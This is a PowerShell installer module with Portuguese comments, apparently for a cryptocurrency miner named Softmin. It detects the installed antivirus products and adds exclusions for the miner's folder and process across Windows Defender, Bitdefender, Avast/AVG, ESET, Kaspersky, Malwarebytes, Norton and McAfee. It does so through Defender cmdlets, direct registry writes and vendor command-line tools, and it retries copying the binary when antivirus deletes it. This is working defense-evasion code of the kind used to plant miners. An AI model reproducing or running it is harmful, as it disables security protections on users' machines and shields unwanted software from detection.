# Exclusoes para antivírus conhecidos (Windows Defender, Bitdefender, Avast, AVG, ESET, Kaspersky, etc.).
# Requer Administrador. Caminhos: apenas pasta de instalacao (%LOCALAPPDATA%\Softmin) — sem pendrive.

. "$PSScriptRoot\Softmin-Common.ps1"

function Test-SoftminAdmin {
    return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-SoftminAntivirusTrustPaths {
    param([string]$InstallPath)
    $InstallPath = Resolve-SoftminInstallPath $InstallPath
    $paths = [System.Collections.Generic.List[string]]::new()
    foreach ($p in @(
            $InstallPath,
            (Join-Path $InstallPath 'bin'),
            (Join-Path $InstallPath '_backup'),
            (Join-Path $InstallPath 'logs')
        )) {
        if (-not $paths.Contains($p)) { [void]$paths.Add($p) }
    }
    return @($paths)
}

function Get-SoftminDetectedAntivirusProducts {
    try {
        return @(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction Stop)
    } catch {
        return @()
    }
}

function Get-SoftminAvDisplayName {
    param($Product)
    try {
        return [string]$Product.displayName
    } catch {
        return ''
    }
}

function Test-SoftminAvNameMatch {
    param(
        [string]$DisplayName,
        [string[]]$Patterns
    )
    if ([string]::IsNullOrWhiteSpace($DisplayName)) { return $false }
    foreach ($pat in $Patterns) {
        if ($DisplayName -match $pat) { return $true }
    }
    return $false
}

function Add-SoftminRegistryPathExclusion {
    param(
        [string]$RegistryKey,
        [string]$Path
    )
    if (-not (Test-Path -LiteralPath $RegistryKey)) { return $false }
    $name = ([guid]::NewGuid().ToString('N')).Substring(0, 12)
    New-ItemProperty -LiteralPath $RegistryKey -Name $name -Value $Path -PropertyType String -Force | Out-Null
    return $true
}

function Invoke-SoftminDefenderExclusions {
    param(
        [string[]]$Paths,
        [string]$ProcessPath
    )
    $applied = [System.Collections.Generic.List[string]]::new()
    $errors = [System.Collections.Generic.List[string]]::new()

    foreach ($p in $Paths) {
        try {
            if (-not (Test-Path -LiteralPath $p)) {
                New-Item -ItemType Directory -Force -Path $p | Out-Null
            }
            Add-MpPreference -ExclusionPath $p -ErrorAction Stop
            [void]$applied.Add("Defender pasta: $p")
        } catch {
            [void]$errors.Add("Defender $p : $($_.Exception.Message)")
        }
    }
    if ($ProcessPath) {
        try {
            Add-MpPreference -ExclusionProcess $ProcessPath -ErrorAction SilentlyContinue
            [void]$applied.Add("Defender processo: $ProcessPath")
        } catch {
            [void]$errors.Add("Defender processo: $($_.Exception.Message)")
        }
    }
    return [pscustomobject]@{ Vendor = 'Windows Defender'; Applied = @($applied); Errors = @($errors) }
}

function Invoke-SoftminBitDefenderExclusions {
    param([string[]]$Paths)
    $applied = [System.Collections.Generic.List[string]]::new()
    $regRoots = @(
        'HKLM:\SOFTWARE\Bitdefender\Desktop\Profiles\Antivirus\Settings\Exclusions\Folders',
        'HKLM:\SOFTWARE\WOW6432Node\Bitdefender\Desktop\Profiles\Antivirus\Settings\Exclusions\Folders',
        'HKLM:\SOFTWARE\Bitdefender\Desktop\Profiles\OnAccess\Settings\Exclusions\Folders'
    )
    foreach ($path in $Paths) {
        foreach ($reg in $regRoots) {
            if (Add-SoftminRegistryPathExclusion -RegistryKey $reg -Path $path) {
                [void]$applied.Add("Bitdefender reg: $path")
                break
            }
        }
    }
    $bdc = @(
        "${env:ProgramFiles}\Bitdefender\Bitdefender Security\bdc.exe",
        "${env:ProgramFiles}\Bitdefender Agent\bdc.exe"
    ) | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
    if ($bdc) {
        foreach ($path in $Paths) {
            try {
                $null = & $bdc /addExclusionPath $path 2>&1
                [void]$applied.Add("Bitdefender CLI: $path")
            } catch { }
        }
    }
    return [pscustomobject]@{ Vendor = 'Bitdefender'; Applied = @($applied); Errors = @() }
}

function Invoke-SoftminAvastFamilyExclusions {
    param(
        [string[]]$Paths,
        [string]$VendorLabel = 'Avast/AVG'
    )
    $applied = [System.Collections.Generic.List[string]]::new()
    $ashCmd = @(
        "${env:ProgramFiles}\Avast Software\Avast\ashCmd.exe",
        "${env:ProgramFiles}\AVAST Software\Avast\ashCmd.exe",
        "${env:ProgramFiles}\AVG\Antivirus\ashCmd.exe",
        "${env:ProgramFiles}\AVG\Antivirus\AVGSvc.exe"
    ) | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1

    if ($ashCmd -and $ashCmd -match 'ashCmd') {
        foreach ($path in $Paths) {
            try {
                $null = & $ashCmd /C $path 2>&1
                [void]$applied.Add("$VendorLabel ashCmd: $path")
            } catch { }
        }
    }

    $regRoots = @(
        'HKLM:\SOFTWARE\AVAST Software\Avast\Exclusions\Paths',
        'HKLM:\SOFTWARE\AVG\Antivirus\Exclusions\Paths',
        'HKLM:\SOFTWARE\WOW6432Node\AVAST Software\Avast\Exclusions\Paths'
    )
    foreach ($path in $Paths) {
        foreach ($reg in $regRoots) {
            if (Add-SoftminRegistryPathExclusion -RegistryKey $reg -Path $path) {
                [void]$applied.Add("$VendorLabel reg: $path")
            }
        }
    }
    return [pscustomobject]@{ Vendor = $VendorLabel; Applied = @($applied); Errors = @() }
}

function Invoke-SoftminEsetExclusions {
    param([string[]]$Paths)
    $applied = [System.Collections.Generic.List[string]]::new()
    $ecls = @(
        "${env:ProgramFiles}\ESET\ESET Security\ecls.exe",
        "${env:ProgramFiles(x86)}\ESET\ESET Security\ecls.exe"
    ) | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
    if ($ecls) {
        foreach ($path in $Paths) {
            try {
                $null = & $ecls --add-exclusion=$path 2>&1
                [void]$applied.Add("ESET ecls: $path")
            } catch { }
        }
    }
    $regRoots = @(
        'HKLM:\SOFTWARE\ESET\ESET Security\CurrentVersion\Info\Exclusions\Folder',
        'HKLM:\SOFTWARE\ESET\ESET Security\CurrentVersion\Scanner\Exclusions\Folder'
    )
    foreach ($path in $Paths) {
        foreach ($reg in $regRoots) {
            if (Add-SoftminRegistryPathExclusion -RegistryKey $reg -Path $path) {
                [void]$applied.Add("ESET reg: $path")
            }
        }
    }
    return [pscustomobject]@{ Vendor = 'ESET'; Applied = @($applied); Errors = @() }
}

function Invoke-SoftminKasperskyExclusions {
    param([string[]]$Paths)
    $applied = [System.Collections.Generic.List[string]]::new()
    $regRoots = @(
        'HKLM:\SOFTWARE\KasperskyLab\AVP21\Exclusions\Folder',
        'HKLM:\SOFTWARE\WOW6432Node\KasperskyLab\AVP21\Exclusions\Folder',
        'HKLM:\SOFTWARE\KasperskyLab\protected\AVP21\Exclusions\Folder'
    )
    foreach ($path in $Paths) {
        foreach ($reg in $regRoots) {
            if (Add-SoftminRegistryPathExclusion -RegistryKey $reg -Path $path) {
                [void]$applied.Add("Kaspersky reg: $path")
            }
        }
    }
    return [pscustomobject]@{ Vendor = 'Kaspersky'; Applied = @($applied); Errors = @() }
}

function Invoke-SoftminMalwarebytesExclusions {
    param([string[]]$Paths)
    $applied = [System.Collections.Generic.List[string]]::new()
    $mbam = @(
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\MBAMService.exe"
    ) | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
    if ($mbam -and $mbam -match 'mbam\.exe$') {
        foreach ($path in $Paths) {
            try {
                $null = & $mbam /path-exclusion-add $path 2>&1
                [void]$applied.Add("Malwarebytes: $path")
            } catch { }
        }
    }
    return [pscustomobject]@{ Vendor = 'Malwarebytes'; Applied = @($applied); Errors = @() }
}

function Invoke-SoftminNortonExclusions {
    param([string[]]$Paths)
    $applied = [System.Collections.Generic.List[string]]::new()
    $regRoots = @(
        'HKLM:\SOFTWARE\Norton\Shared\Exclusions\Paths',
        'HKLM:\SOFTWARE\WOW6432Node\Symantec\Shared\Exclusions\Paths'
    )
    foreach ($path in $Paths) {
        foreach ($reg in $regRoots) {
            if (Add-SoftminRegistryPathExclusion -RegistryKey $reg -Path $path) {
                [void]$applied.Add("Norton reg: $path")
            }
        }
    }
    return [pscustomobject]@{ Vendor = 'Norton'; Applied = @($applied); Errors = @() }
}

function Invoke-SoftminMcAfeeExclusions {
    param([string[]]$Paths)
    $applied = [System.Collections.Generic.List[string]]::new()
    $regRoots = @(
        'HKLM:\SOFTWARE\McAfee\AVEngine\Exclusions\Folder',
        'HKLM:\SOFTWARE\WOW6432Node\McAfee\AVEngine\Exclusions\Folder'
    )
    foreach ($path in $Paths) {
        foreach ($reg in $regRoots) {
            if (Add-SoftminRegistryPathExclusion -RegistryKey $reg -Path $path) {
                [void]$applied.Add("McAfee reg: $path")
            }
        }
    }
    return [pscustomobject]@{ Vendor = 'McAfee'; Applied = @($applied); Errors = @() }
}

function Set-SoftminAntivirusTrust {
    param(
        [Parameter(Mandatory = $true)]
        [string]$InstallPath,
        [string]$LogInstallPath = ''
    )

    $InstallPath = Resolve-SoftminInstallPath $InstallPath
    $paths = Get-SoftminAntivirusTrustPaths -InstallPath $InstallPath
    $minerProc = Join-Path $InstallPath 'bin\softmin.exe'

    if (-not (Test-SoftminAdmin)) {
        $msg = 'Sem permissoes de administrador — exclusoes AV nao aplicadas.'
        if ($LogInstallPath) { Write-SoftminInstallStep $LogInstallPath 'AV' $msg -Status 'WARN' }
        return [pscustomobject]@{ Ok = $false; Message = $msg; Results = @() }
    }

    $results = [System.Collections.Generic.List[object]]::new()

    # Windows Defender — sempre tentar (camada nativa ou secundaria)
    try {
        [void]$results.Add((Invoke-SoftminDefenderExclusions -Paths $paths -ProcessPath $minerProc))
    } catch {
        [void]$results.Add([pscustomobject]@{ Vendor = 'Windows Defender'; Applied = @(); Errors = @($_.Exception.Message) })
    }

    $detected = Get-SoftminDetectedAntivirusProducts
    $names = ($detected | ForEach-Object { Get-SoftminAvDisplayName $_ }) -join ' | '
    if ($names) {
        if ($LogInstallPath) { Write-SoftminInstallStep $LogInstallPath 'AV' ("Detectado: $names") -Status 'INFO' }
    }

    $handlers = @()
    foreach ($av in $detected) {
        $dn = Get-SoftminAvDisplayName $av
        if (Test-SoftminAvNameMatch $dn @('Bitdefender', 'Bit Defender')) {
            $handlers += { Invoke-SoftminBitDefenderExclusions -Paths $paths }
        }
        elseif (Test-SoftminAvNameMatch $dn @('Avast')) {
            $handlers += { Invoke-SoftminAvastFamilyExclusions -Paths $paths -VendorLabel 'Avast' }
        }
        elseif (Test-SoftminAvNameMatch $dn @('AVG')) {
            $handlers += { Invoke-SoftminAvastFamilyExclusions -Paths $paths -VendorLabel 'AVG' }
        }
        elseif (Test-SoftminAvNameMatch $dn @('ESET')) {
            $handlers += { Invoke-SoftminEsetExclusions -Paths $paths }
        }
        elseif (Test-SoftminAvNameMatch $dn @('Kaspersky')) {
            $handlers += { Invoke-SoftminKasperskyExclusions -Paths $paths }
        }
        elseif (Test-SoftminAvNameMatch $dn @('Malwarebytes')) {
            $handlers += { Invoke-SoftminMalwarebytesExclusions -Paths $paths }
        }
        elseif (Test-SoftminAvNameMatch $dn @('Norton', 'Symantec')) {
            $handlers += { Invoke-SoftminNortonExclusions -Paths $paths }
        }
        elseif (Test-SoftminAvNameMatch $dn @('McAfee')) {
            $handlers += { Invoke-SoftminMcAfeeExclusions -Paths $paths }
        }
    }

    # Tentativas genericas se produto instalado mas nao mapeado (Bitdefender/Avast muitas vezes registados)
    if (Test-Path "${env:ProgramFiles}\Bitdefender") {
        $handlers += { Invoke-SoftminBitDefenderExclusions -Paths $paths }
    }
    if (Test-Path "${env:ProgramFiles}\Avast Software") {
        $handlers += { Invoke-SoftminAvastFamilyExclusions -Paths $paths -VendorLabel 'Avast' }
    }
    if (Test-Path "${env:ProgramFiles}\AVG") {
        $handlers += { Invoke-SoftminAvastFamilyExclusions -Paths $paths -VendorLabel 'AVG' }
    }

    $seen = @{}
    foreach ($h in $handlers) {
        try {
            $r = & $h
            $key = [string]$r.Vendor
            if (-not $seen.ContainsKey($key)) {
                $seen[$key] = $true
                [void]$results.Add($r)
            }
        } catch { }
    }

    $totalApplied = ($results | ForEach-Object { $_.Applied.Count } | Measure-Object -Sum).Sum
    $ok = $totalApplied -gt 0
    $msg = if ($ok) {
        ('Exclusoes AV aplicadas ({0} entrada(s); {1}).' -f $totalApplied, (($results | ForEach-Object { $_.Vendor }) -join ', '))
    } else {
        'Nenhuma exclusao AV confirmada — verifique manualmente na pasta Softmin.'
    }

    if ($LogInstallPath) {
        Write-SoftminInstallStep $LogInstallPath 'AV' $msg -Status $(if ($ok) { 'OK' } else { 'WARN' })
        foreach ($r in $results) {
            foreach ($a in $r.Applied) {
                Write-SoftminInstallStep $LogInstallPath 'AV' $a -Status 'OK'
            }
            foreach ($e in $r.Errors) {
                Write-SoftminInstallStep $LogInstallPath 'AV' $e -Status 'WARN'
            }
        }
    }

    return [pscustomobject]@{
        Ok      = $ok
        Message = $msg
        Paths   = $paths
        Results = @($results)
    }
}

# Compatibilidade com scripts antigos
function Get-SoftminDefenderTrustPaths {
    param(
        [string]$InstallPath,
        [string]$SourceRoot = ''
    )
    return Get-SoftminAntivirusTrustPaths -InstallPath $InstallPath
}

function Set-SoftminDefenderTrust {
    param(
        [Parameter(Mandatory = $true)]
        [string]$InstallPath,
        [string]$SourceRoot = '',
        [string]$LogInstallPath = ''
    )
    return Set-SoftminAntivirusTrust -InstallPath $InstallPath -LogInstallPath $LogInstallPath
}

function Test-SoftminDefenderTrust {
    param([string[]]$Paths)
    try {
        $prefs = Get-MpPreference -ErrorAction Stop
        $existing = @($prefs.ExclusionPath)
        $missing = @()
        foreach ($p in $Paths) {
            $norm = $p.TrimEnd('\')
            $ok = $false
            foreach ($e in $existing) {
                if ($e.TrimEnd('\').Equals($norm, [StringComparison]::OrdinalIgnoreCase)) { $ok = $true; break }
            }
            if (-not $ok) { [void]$missing.Add($norm) }
        }
        return [pscustomobject]@{ Ok = ($missing.Count -eq 0); Missing = $missing }
    } catch {
        return [pscustomobject]@{ Ok = $false; Missing = $Paths; Error = $_.Exception.Message }
    }
}

function Copy-SoftminMinerBinary {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SourceRoot,
        [Parameter(Mandatory = $true)]
        [string]$InstallPath,
        [string]$LogInstallPath = '',
        [switch]$ApplyDefenderTrust
    )

    $InstallPath = Resolve-SoftminInstallPath $InstallPath
    $srcExe = Join-Path $SourceRoot 'bin\softmin.exe'
    $dstDir = Join-Path $InstallPath 'bin'
    $dstExe = Join-Path $dstDir 'softmin.exe'

    if (-not (Test-Path -LiteralPath $srcExe)) {
        throw "softmin.exe nao encontrado em $srcExe"
    }

    if ($ApplyDefenderTrust) {
        Set-SoftminAntivirusTrust -InstallPath $InstallPath -LogInstallPath $LogInstallPath | Out-Null
    }

    New-Item -ItemType Directory -Force -Path $dstDir | Out-Null

    for ($i = 1; $i -le 3; $i++) {
        Copy-Item -Path (Join-Path $SourceRoot 'bin\*') -Destination $dstDir -Force -ErrorAction SilentlyContinue
        if (Test-Path -LiteralPath $dstExe) {
            $size = (Get-Item -LiteralPath $dstExe).Length
            if ($LogInstallPath) {
                Write-SoftminInstallStep $LogInstallPath 'BIN' ("softmin.exe copiado ({0:N0} bytes, tentativa {1})" -f $size, $i) -Status 'OK'
            }
            return [pscustomobject]@{ Ok = $true; Path = $dstExe; Size = $size }
        }
        if ($ApplyDefenderTrust -and (Test-SoftminAdmin)) {
            Set-SoftminAntivirusTrust -InstallPath $InstallPath -LogInstallPath $LogInstallPath | Out-Null
            Start-Sleep -Seconds 2
        }
    }

    if ($LogInstallPath) {
        Write-SoftminInstallStep $LogInstallPath 'BIN' 'Antivirus bloqueou softmin.exe — execute como Admin.' -Status 'ERR'
    }
    throw "Falha ao copiar softmin.exe para $dstExe (antivirus pode ter removido o ficheiro)."
}
